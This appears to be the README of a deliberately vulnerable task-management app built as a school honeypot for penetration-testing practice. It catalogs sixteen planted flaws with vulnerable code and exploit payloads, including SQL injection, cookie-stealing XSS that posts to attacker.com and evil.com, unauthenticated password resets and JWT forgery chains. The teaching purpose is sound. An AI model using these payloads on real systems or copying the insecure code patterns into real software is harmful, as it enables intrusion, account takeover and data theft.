# 🍯 TaskFlow — Honeypot Application

> **⚠️ EDUCATIONAL PURPOSE ONLY — This application is intentionally vulnerable.**
>
> TaskFlow is a deliberately insecure task management web application designed as a **honeypot** for a cybersecurity school project (SSIR-5). It looks and feels like a real SaaS product, but contains **16+ planted security vulnerabilities** across the backend for penetration testing, security research, and attack detection.

![TaskFlow](https://img.shields.io/badge/TaskFlow-Honeypot-e11d48)
![Vulnerabilities](https://img.shields.io/badge/Vulnerabilities-16+-ff6b6b)
![React](https://img.shields.io/badge/React-18.2-61dafb)
![Express](https://img.shields.io/badge/Express-4.18-000000)
![PostgreSQL](https://img.shields.io/badge/PostgreSQL-15+-4169e1)

---

## Table of Contents

1. [Overview](#overview)
2. [Tech Stack](#tech-stack)
3. [Architecture](#architecture)
4. [Setup & Installation](#setup--installation)
5. [Vulnerability Catalog](#-vulnerability-catalog)
   - [V-01: Stored XSS](#v-01-stored-cross-site-scripting-xss)
   - [V-02: SQL Injection (Search)](#v-02-sql-injection--search-endpoint)
   - [V-03: SQL Injection (Admin)](#v-03-sql-injection--admin-search)
   - [V-04: IDOR (Public Tasks)](#v-04-insecure-direct-object-reference-idor--public-tasks)
   - [V-05: Unauthenticated Admin Panel](#v-05-unauthenticated-admin-panel)
   - [V-06: User Enumeration](#v-06-user-enumeration)
   - [V-07: Broken Password Reset](#v-07-broken-password-reset)
   - [V-08: Debug Endpoint (Info Leak)](#v-08-debug-endpoint--information-leakage)
   - [V-09: Config Endpoint (Secret Leak)](#v-09-config-endpoint--secret-leakage)
   - [V-10: User Backup Endpoint](#v-10-user-backup-endpoint--mass-data-exposure)
   - [V-11: Wildcard CORS](#v-11-wildcard-cors-misconfiguration)
   - [V-12: Server Information Disclosure](#v-12-server-information-disclosure-via-headers)
   - [V-13: Verbose Error Handling](#v-13-verbose-error-handling--stack-trace-exposure)
   - [V-14: 404 Header Leakage](#v-14-404-handler--request-header-leakage)
   - [V-15: Excessive Body Size Limit](#v-15-excessive-json-body-size-limit)
   - [V-16: Bulk Task Export](#v-16-bulk-task-export-without-authorization)
6. [OWASP Top 10 Mapping](#owasp-top-10-2021-mapping)
7. [Folder Structure](#folder-structure)
8. [API Documentation](#api-documentation)
9. [Disclaimer](#disclaimer)

---

## Overview

TaskFlow presents itself as a modern, polished task management SaaS. It has a full landing page with pricing, testimonials, integrations, and a professional dashboard with charts and analytics — all designed to appear legitimate and attract interaction.

**Under the surface**, the backend is riddled with intentional security flaws covering injection attacks, broken access control, security misconfiguration, information disclosure, and more.

## Tech Stack

| Layer | Technology |
|-------|------------|
| **Frontend** | React 18, Vite 5, React Router 6, Tailwind CSS 3 |
| **Charts** | Recharts |
| **Icons** | Lucide React |
| **HTTP Client** | Axios |
| **Backend** | Node.js, Express 4 |
| **Database** | PostgreSQL 15+ |
| **ORM** | Prisma 5 |
| **Auth** | JWT (jsonwebtoken), bcryptjs |
| **Containerization** | Docker, Docker Compose |

## Architecture

```
┌──────────────────────────────────────────────────────┐
│                    React Frontend                     │
│  (Vite + Tailwind CSS + React Router + Recharts)     │
├──────────────────────────────────────────────────────┤
│                     REST API                          │
│              (Axios ↔ Express.js)                    │
├──────────────────────────────────────────────────────┤
│                  Express Backend                      │
│  (Controllers → Services → Prisma ORM)               │
│  ⚠️  16+ intentional vulnerabilities here            │
├──────────────────────────────────────────────────────┤
│                   PostgreSQL                          │
│           (Users, Tasks tables)                       │
└──────────────────────────────────────────────────────┘
```

## Setup & Installation

### Docker (Recommended)

```bash
docker compose up --build
```

Access points:
- **Frontend:** http://localhost or http://localhost:5173
- **Backend API:** http://localhost:5000/api
- **PostgreSQL:** localhost:5432

### Manual Setup

1. **Prerequisites:** Node.js ≥ 18, npm ≥ 9, PostgreSQL ≥ 15

2. **Create the database:**
   ```sql
   CREATE DATABASE taskflow;
   ```

3. **Configure environment** — create `server/.env`:
   ```env
   DATABASE_URL="postgresql://postgres:password@localhost:5432/taskflow"
   JWT_SECRET="your_super_secret_jwt_key_here"
   JWT_EXPIRES_IN="7d"
   PORT=5000
   CLIENT_URL="http://localhost:5173"
   NODE_ENV="development"
   ```

4. **Install and run:**
   ```bash
   npm install
   cd server && npm install && npx prisma generate && npx prisma migrate dev --name init
   cd ../client && npm install
   cd .. && npm run dev
   ```

---

## 🔓 Vulnerability Catalog

Below is a comprehensive list of every intentional vulnerability planted in the application. Each entry includes the vulnerability type, the exact file and line where it lives, how to exploit it, and the potential impact.

---

### V-01: Stored Cross-Site Scripting (XSS)

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 High |
| **OWASP** | A03:2021 — Injection |
| **CWE** | CWE-79 (Improper Neutralization of Input During Web Page Generation) |
| **File** | `client/src/components/tasks/TaskCard.jsx` |
| **Root Cause** | Task description is rendered using React's `dangerouslySetInnerHTML` without any sanitization |

**Vulnerable Code:**
```jsx
<p
  className="text-sm text-gray-600 mt-1 line-clamp-2"
  dangerouslySetInnerHTML={{ __html: task.description }}
/>
```

**Exploit:**
1. Create a task with the following description:
   ```html
   <img src=x onerror="alert(document.cookie)">
   ```
   or:
   ```html
   <script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
   ```
2. When any user views the task, the injected script executes in their browser.

**Impact:** Session hijacking (steal JWT token from localStorage), keylogging, phishing overlays, defacement, or redirect to a malicious site.

---

### V-02: SQL Injection — Search Endpoint

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **OWASP** | A03:2021 — Injection |
| **CWE** | CWE-89 (SQL Injection) |
| **File** | `server/src/app.js` (line ~104) |
| **Root Cause** | User input is concatenated directly into a raw SQL query via `prisma.$queryRawUnsafe()` |

**Vulnerable Code:**
```javascript
app.get('/api/search', async (req, res) => {
  const { q } = req.query;
  const results = await prisma.$queryRawUnsafe(
    `SELECT id, title, description, status, priority, "createdAt"
     FROM "Task"
     WHERE title ILIKE '%${q}%' OR description ILIKE '%${q}%'
     ORDER BY "createdAt" DESC LIMIT 20`
  );
  res.json({ success: true, data: results });
});
```

**Exploit:**
```
GET /api/search?q=' UNION SELECT id,email,password,name,role,cast("createdAt" as text) FROM "User"--
```
This injects a UNION query that dumps the entire User table including password hashes.

**Other payloads:**
```
GET /api/search?q=' OR 1=1--                     # Dump all tasks
GET /api/search?q='; DROP TABLE "Task";--         # Destructive attack
```

**Impact:** Full database compromise — read any table, extract credentials, modify or delete data, potential remote code execution via PostgreSQL extensions.

---

### V-03: SQL Injection — Admin Search

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **OWASP** | A03:2021 — Injection |
| **CWE** | CWE-89 (SQL Injection) |
| **File** | `server/src/routes/adminRoutes.js` (line ~85) |
| **Root Cause** | Same pattern as V-02 — raw SQL with string interpolation, plus no auth required |

**Vulnerable Code:**
```javascript
router.get('/search', async (req, res) => {
  const { q, table } = req.query;
  const targetTable = table === 'users' ? 'User' : 'Task';
  const results = await prisma.$queryRawUnsafe(
    `SELECT * FROM "${targetTable}" WHERE CAST(id AS TEXT) LIKE '%${q}%'
     OR CAST("createdAt" AS TEXT) LIKE '%${q}%' LIMIT 50`
  );
});
```

**Exploit:**
```
GET /api/admin/search?q=' UNION SELECT * FROM "User"--&table=users
```

**Impact:** Same as V-02, but made worse by having zero authentication. Any anonymous user can perform SQL injection against the database through this admin endpoint.

---

### V-04: Insecure Direct Object Reference (IDOR) — Public Tasks

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **OWASP** | A01:2021 — Broken Access Control |
| **CWE** | CWE-639 (Authorization Bypass Through User-Controlled Key) |
| **Files** | `server/src/controllers/taskController.js`, `server/src/services/taskService.js` |
| **Root Cause** | Public endpoints allow reading, updating, and deleting any task by ID without verifying the requester owns the task |

**Vulnerable Endpoints:**
```
GET    /api/tasks/public/:id      → Read any task
PUT    /api/tasks/public/:id      → Modify any task
DELETE /api/tasks/public/:id      → Delete any task
```

**Vulnerable Service Code:**
```javascript
// taskService.js — no userId check
async getTaskById(id) {
  return prisma.task.findUnique({ where: { id: parseInt(id) } });
}
async updateTaskById(id, data) {
  return prisma.task.update({ where: { id: parseInt(id) }, data });
}
async deleteTaskById(id) {
  return prisma.task.delete({ where: { id: parseInt(id) } });
}
```

**Exploit:**
```bash
# Read another user's task
curl http://localhost:5000/api/tasks/public/1

# Modify another user's task
curl -X PUT http://localhost:5000/api/tasks/public/1 \
  -H "Content-Type: application/json" \
  -d '{"title":"Hacked","status":"COMPLETED"}'

# Delete another user's task
curl -X DELETE http://localhost:5000/api/tasks/public/1
```

**Impact:** Any user (or anonymous attacker) can read, modify, or delete any task in the system by iterating over task IDs (1, 2, 3…).

---

### V-05: Unauthenticated Admin Panel

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **OWASP** | A01:2021 — Broken Access Control |
| **CWE** | CWE-306 (Missing Authentication for Critical Function) |
| **File** | `server/src/routes/adminRoutes.js` |
| **Root Cause** | All admin routes are mounted without any authentication or authorization middleware |

**Unprotected Admin Endpoints:**
```
GET    /api/admin/users          → List ALL users (including password hashes!)
GET    /api/admin/users/:id      → Get any user's full details + tasks
DELETE /api/admin/users/:id      → Delete any user account
GET    /api/admin/tasks          → Export every task in the database
GET    /api/admin/search         → SQL-injectable search (see V-03)
GET    /api/admin/stats          → Server stats with process info
```

**Exploit:**
```bash
# List all users with password hashes
curl http://localhost:5000/api/admin/users

# Response includes:
# { "id": 1, "email": "admin@taskflow.com", "password": "$2a$10$...", ... }

# Delete a user
curl -X DELETE http://localhost:5000/api/admin/users/1
```

**Impact:** Complete takeover — anyone on the network can list all users with their bcrypt password hashes, delete any account, export all data, and perform SQL injection. No login required.

---

### V-06: User Enumeration

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **CWE** | CWE-204 (Observable Response Discrepancy) |
| **File** | `server/src/controllers/authController.js` |
| **Root Cause** | Two separate endpoints reveal whether an email address is registered |

**Vulnerable Code — Registration:**
```javascript
const existingUser = await prisma.user.findUnique({ where: { email } });
if (existingUser) {
  return res.status(409).json({
    success: false,
    message: 'A user with this email already exists'
  });
}
```

**Vulnerable Code — Check Email:**
```javascript
const checkEmail = async (req, res) => {
  const { email } = req.query;
  const user = await prisma.user.findUnique({ where: { email } });
  if (user) {
    return res.json({
      exists: true,
      user: { id: user.id, name: user.name, email: user.email, createdAt: user.createdAt }
    });
  }
  return res.json({ exists: false });
};
```

**Exploit:**
```bash
# Check if an email is registered (returns user details if yes!)
curl "http://localhost:5000/api/auth/check-email?email=admin@taskflow.com"

# Response: { "exists": true, "user": { "id": 1, "name": "Admin", ... } }
```

**Impact:** Attacker can verify which email addresses are registered, harvest user names and IDs, and use this for targeted brute-force or phishing attacks.

---

### V-07: Broken Password Reset

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 Critical |
| **OWASP** | A07:2021 — Identification and Authentication Failures |
| **CWE** | CWE-640 (Weak Password Recovery Mechanism) |
| **File** | `server/src/controllers/authController.js` |
| **Root Cause** | Password reset requires only the email and new password — no verification token, no email confirmation, no old password check |

**Vulnerable Code:**
```javascript
const resetPassword = async (req, res) => {
  const { email, newPassword } = req.body;
  const user = await prisma.user.findUnique({ where: { email } });
  if (!user) {
    return res.status(404).json({ success: false, message: 'User not found' });
  }
  const hashedPassword = await bcrypt.hash(newPassword, 10);
  await prisma.user.update({
    where: { email },
    data: { password: hashedPassword }
  });
  res.json({ success: true, message: 'Password reset successful' });
};
```

**Exploit:**
```bash
# Reset ANY user's password without any verification
curl -X POST http://localhost:5000/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@example.com","newPassword":"hacked123"}'
```

**Impact:** Complete account takeover — any attacker who knows (or enumerates via V-06) a user's email can reset their password and log in as them.

---

### V-08: Debug Endpoint — Information Leakage

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 High |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **CWE** | CWE-215 (Insertion of Sensitive Information Into Debugging Code) |
| **File** | `server/src/app.js` (line ~70) |
| **Root Cause** | A debug endpoint exposes all environment variables, memory usage, PID, and working directory to any unauthenticated request |

**Vulnerable Code:**
```javascript
app.get('/api/debug', (req, res) => {
  res.json({
    environment: process.env,   // ← ALL env vars!
    memory: process.memoryUsage(),
    uptime: process.uptime(),
    pid: process.pid,
    cwd: process.cwd(),
    nodeVersion: process.version,
  });
});
```

**Exploit:**
```bash
curl http://localhost:5000/api/debug
```

**Leaked Data Includes:**
- `DATABASE_URL` — Full PostgreSQL connection string with credentials
- `JWT_SECRET` — Can forge authentication tokens for any user
- `NODE_ENV`, `PORT`, `CLIENT_URL` — Infrastructure details
- Process PID, memory usage, uptime — OS-level information

**Impact:** Exposes database credentials (allows direct DB access), JWT secret (allows forging auth tokens for any user), and infrastructure details useful for further attacks.

---

### V-09: Config Endpoint — Secret Leakage

| Field | Detail |
|-------|--------|
| **Severity** | 🔴 High |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **CWE** | CWE-200 (Exposure of Sensitive Information) |
| **File** | `server/src/app.js` (line ~82) |
| **Root Cause** | A config endpoint exposes the JWT secret and database configuration to unauthenticated users |

**Vulnerable Code:**
```javascript
app.get('/api/config', (req, res) => {
  res.json({
    app: { name: 'TaskFlow', version: '2.1.0', environment: process.env.NODE_ENV },
    auth: { jwtSecret: process.env.JWT_SECRET, jwtExpiresIn: process.env.JWT_EXPIRES_IN },
    database: { url: process.env.DATABASE_URL, provider: 'postgresql' },
    features: { registration: true, passwordReset: true, publicTasks: true },
  });
});
```

**Exploit:**
```bash
curl http://localhost:5000/api/config
# Returns JWT secret → forge tokens for any user
```

**Impact:** Redundant exposure of secrets already available via V-08, but through a more "discoverable" endpoint name. An attacker who finds `/api/config` can immediately forge JWT tokens.

---

### V-10: User Backup Endpoint — Mass Data Exposure

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **OWASP** | A01:2021 — Broken Access Control |
| **CWE** | CWE-200 (Exposure of Sensitive Information) |
| **File** | `server/src/app.js` (line ~92) |
| **Root Cause** | A backup endpoint exports all users with their associated tasks, with no authentication |

**Vulnerable Code:**
```javascript
app.get('/api/backup/users', async (req, res) => {
  const users = await prisma.user.findMany({ include: { tasks: true } });
  res.json({
    exportedAt: new Date().toISOString(),
    count: users.length,
    users,
  });
});
```

**Exploit:**
```bash
curl http://localhost:5000/api/backup/users
```

**Impact:** Dumps the entire user table (email, name, hashed passwords) and all their tasks. Combined with V-08 (for the JWT secret) this is a complete data breach.

---

### V-11: Wildcard CORS Misconfiguration

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **CWE** | CWE-942 (Overly Permissive Cross-domain Whitelist) |
| **File** | `server/src/app.js` (line ~15) |
| **Root Cause** | CORS is configured with `origin: '*'` and `credentials: true` |

**Vulnerable Code:**
```javascript
app.use(cors({
  origin: '*',
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'Authorization'],
}));
```

**Impact:** Any website on the internet can make authenticated requests to this API. If a user visits a malicious page while logged in, that page can:
- Read their tasks
- Create/delete tasks
- Access their profile
- Call any API endpoint on their behalf

---

### V-12: Server Information Disclosure via Headers

| Field | Detail |
|-------|--------|
| **Severity** | 🟢 Low |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **CWE** | CWE-200 (Exposure of Sensitive Information) |
| **File** | `server/src/app.js` (line ~22) |
| **Root Cause** | Custom middleware adds precise version information to every HTTP response |

**Vulnerable Code:**
```javascript
app.use((req, res, next) => {
  res.setHeader('X-Powered-By', 'Express 4.18.2');
  res.setHeader('Server', 'TaskFlow/2.1.0 (Ubuntu 22.04, Node 18.17.0)');
  next();
});
```

**Impact:** Every response reveals the exact Express version, application version, operating system, and Node.js version. This helps attackers identify known CVEs for these specific versions and tailor their attacks.

---

### V-13: Verbose Error Handling — Stack Trace Exposure

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **CWE** | CWE-209 (Generation of Error Message Containing Sensitive Information) |
| **Files** | `server/src/app.js` (global error handler), `server/src/middleware/errorMiddleware.js` |
| **Root Cause** | Error handler always returns the full stack trace regardless of environment |

**Vulnerable Code:**
```javascript
app.use((err, req, res, next) => {
  console.error('Global Error:', err);
  res.status(err.status || 500).json({
    success: false,
    message: err.message,
    stack: err.stack,         // ← Always exposed, even in production
    timestamp: new Date().toISOString(),
    path: req.originalUrl,
  });
});
```

**Impact:** Stack traces expose internal file paths, library versions, and application architecture. This reconnaissance data helps attackers understand the codebase structure and find additional vulnerabilities.

---

### V-14: 404 Handler — Request Header Leakage

| Field | Detail |
|-------|--------|
| **Severity** | 🟡 Medium |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **CWE** | CWE-200 (Exposure of Sensitive Information) |
| **File** | `server/src/app.js` (line ~140) |
| **Root Cause** | The 404 handler reflects back the client's request headers and IP address |

**Vulnerable Code:**
```javascript
app.use('*', (req, res) => {
  res.status(404).json({
    success: false,
    message: `Route ${req.originalUrl} not found`,
    method: req.method,
    headers: req.headers,      // ← Leaks Authorization header, cookies, etc.
    ip: req.ip,
    suggestion: 'Check /api for available endpoints',
  });
});
```

**Impact:** If a user hits a wrong URL while authenticated, the response mirrors back their JWT token (from the Authorization header). If error responses are logged or cached by a proxy, tokens can be harvested. Also leaks client IP for fingerprinting.

---

### V-15: Excessive JSON Body Size Limit

| Field | Detail |
|-------|--------|
| **Severity** | 🟢 Low |
| **OWASP** | A05:2021 — Security Misconfiguration |
| **CWE** | CWE-770 (Allocation of Resources Without Limits) |
| **File** | `server/src/app.js` (line ~18) |
| **Root Cause** | JSON body parser is configured to accept payloads up to 50 MB |

**Vulnerable Code:**
```javascript
app.use(express.json({ limit: '50mb' }));
```

**Impact:** Enables denial-of-service attacks. An attacker can send a 50 MB JSON payload to any endpoint, consuming server memory and potentially crashing the Node.js process. Normal task data should be limited to ~1 MB at most.

---

### V-16: Bulk Task Export Without Authorization

| Field | Detail |
|-------|--------|
| **Severity** | 🟠 High |
| **OWASP** | A01:2021 — Broken Access Control |
| **CWE** | CWE-862 (Missing Authorization) |
| **Files** | `server/src/controllers/taskController.js`, `server/src/services/taskService.js` |
| **Root Cause** | An export endpoint dumps all tasks from all users, with user details included |

**Vulnerable Service Code:**
```javascript
async getAllTasks() {
  return prisma.task.findMany({
    include: { user: { select: { id: true, name: true, email: true } } },
    orderBy: { createdAt: 'desc' },
  });
}
```

**Impact:** Exposes all tasks across all users, including the name and email of each task's owner. Useful for reconnaissance and data exfiltration.

---

## OWASP Top 10 (2021) Mapping

| OWASP Category | Vulnerabilities |
|----------------|-----------------|
| **A01 — Broken Access Control** | V-04 (IDOR), V-05 (No Auth on Admin), V-10 (Backup Leak), V-16 (Bulk Export) |
| **A03 — Injection** | V-01 (Stored XSS), V-02 (SQLi Search), V-03 (SQLi Admin) |
| **A05 — Security Misconfiguration** | V-08 (Debug), V-09 (Config), V-11 (CORS), V-12 (Headers), V-13 (Stack Traces), V-14 (404 Leak), V-15 (Body Limit) |
| **A07 — Identification & Auth Failures** | V-06 (User Enumeration), V-07 (Broken Password Reset) |

---

## Attack Chains

These vulnerabilities can be chained for maximum impact:

### Chain 1: Anonymous → Full Admin Access
1. **V-08** (`/api/debug`) → Get `JWT_SECRET`
2. Forge a JWT token for any user (e.g., `userId: 1`)
3. Access all authenticated endpoints as that user

### Chain 2: Anonymous → Account Takeover
1. **V-06** (`/api/auth/check-email`) → Enumerate valid emails
2. **V-07** (`/api/auth/reset-password`) → Reset their password without verification
3. Log in as the victim

### Chain 3: Anonymous → Full Database Dump
1. **V-02** (`/api/search?q=...`) → SQL injection to extract all tables
2. Or: **V-05** (`/api/admin/users`) → Get all users with password hashes
3. Crack bcrypt hashes offline

### Chain 4: Stored XSS → Session Hijacking
1. **V-01** → Inject `<img src=x onerror="fetch('https://evil.com/steal?t='+localStorage.getItem('taskflow_token'))">` as a task description
2. When any user views the task, their JWT is sent to the attacker
3. Attacker uses the stolen token to impersonate the victim

---

## Folder Structure

```
honeypot/
│
├── client/                    # React frontend (the bait)
│   ├── src/
│   │   ├── components/
│   │   │   ├── ui/            # Button, Input, Card, Modal, Badge, LoadingSkeleton
│   │   │   ├── dashboard/     # StatsCards, TaskChart, RecentTasks, ProductivityScore,
│   │   │   │                  # UpcomingDeadlines, WeeklyProgress
│   │   │   └── tasks/         # TaskCard (⚠️ XSS), TaskForm, TaskFilters
│   │   ├── pages/             # Landing, Login, Register, Dashboard, Tasks,
│   │   │                      # Profile, Calendar, Activity, Team
│   │   ├── layouts/           # DashboardLayout, AuthLayout
│   │   ├── hooks/             # useAuth, useTasks
│   │   ├── services/          # Axios API client
│   │   └── context/           # AuthContext
│   └── package.json
│
├── server/                    # Express backend (the trap)
│   ├── src/
│   │   ├── controllers/       # authController (⚠️ V-06, V-07), taskController (⚠️ V-04, V-16)
│   │   ├── services/          # taskService (⚠️ IDOR, SQLi)
│   │   ├── routes/            # adminRoutes (⚠️ V-03, V-05)
│   │   ├── middleware/        # authMiddleware, errorMiddleware
│   │   └── app.js             # ⚠️ V-02, V-08, V-09, V-10, V-11, V-12, V-13, V-14, V-15
│   ├── prisma/
│   │   └── schema.prisma
│   └── package.json
│
├── docker-compose.yml
└── README.md                  # ← You are here
```

## API Documentation

### Legitimate Endpoints

| Method | Endpoint | Auth | Description |
|--------|----------|------|-------------|
| `POST` | `/api/auth/register` | No | Create account |
| `POST` | `/api/auth/login` | No | Log in |
| `GET` | `/api/auth/me` | Yes | Get current user |
| `GET` | `/api/tasks` | Yes | List user's tasks |
| `POST` | `/api/tasks` | Yes | Create a task |
| `PUT` | `/api/tasks/:id` | Yes | Update a task |
| `DELETE` | `/api/tasks/:id` | Yes | Delete a task |
| `PATCH` | `/api/tasks/:id/status` | Yes | Change task status |
| `GET` | `/api/users/profile` | Yes | Get profile |
| `PUT` | `/api/users/profile` | Yes | Update profile |
| `PUT` | `/api/users/password` | Yes | Change password |

### Vulnerable Endpoints (Honeypot)

| Method | Endpoint | Auth | Vulnerability |
|--------|----------|------|---------------|
| `GET` | `/api/auth/check-email` | No | V-06: User Enumeration |
| `POST` | `/api/auth/reset-password` | No | V-07: Broken Password Reset |
| `GET` | `/api/search` | No | V-02: SQL Injection |
| `GET` | `/api/tasks/public/:id` | No | V-04: IDOR Read |
| `PUT` | `/api/tasks/public/:id` | No | V-04: IDOR Update |
| `DELETE` | `/api/tasks/public/:id` | No | V-04: IDOR Delete |
| `GET` | `/api/debug` | No | V-08: Env Variable Leak |
| `GET` | `/api/config` | No | V-09: Secret Leak |
| `GET` | `/api/backup/users` | No | V-10: Mass Data Export |
| `GET` | `/api/admin/users` | No | V-05: List Users + Hashes |
| `GET` | `/api/admin/users/:id` | No | V-05: User Details |
| `DELETE` | `/api/admin/users/:id` | No | V-05: Delete User |
| `GET` | `/api/admin/tasks` | No | V-05: Export All Tasks |
| `GET` | `/api/admin/search` | No | V-03: SQL Injection |
| `GET` | `/api/admin/stats` | No | V-05: Server Stats |

---

## Disclaimer

> **This application is for educational and research purposes only.**
>
> - Do **NOT** deploy this application on a public network without proper isolation
> - Do **NOT** use this code as a base for a real application
> - Do **NOT** use the techniques described here against systems you do not own or have explicit authorization to test
> - The vulnerabilities are **intentional** — they exist to teach offensive and defensive security concepts
>
> **Project:** SSIR-5 — Cybersecurity Honeypot  
> **Purpose:** Penetration testing practice & attack detection research

---

## License

MIT — Educational use only.
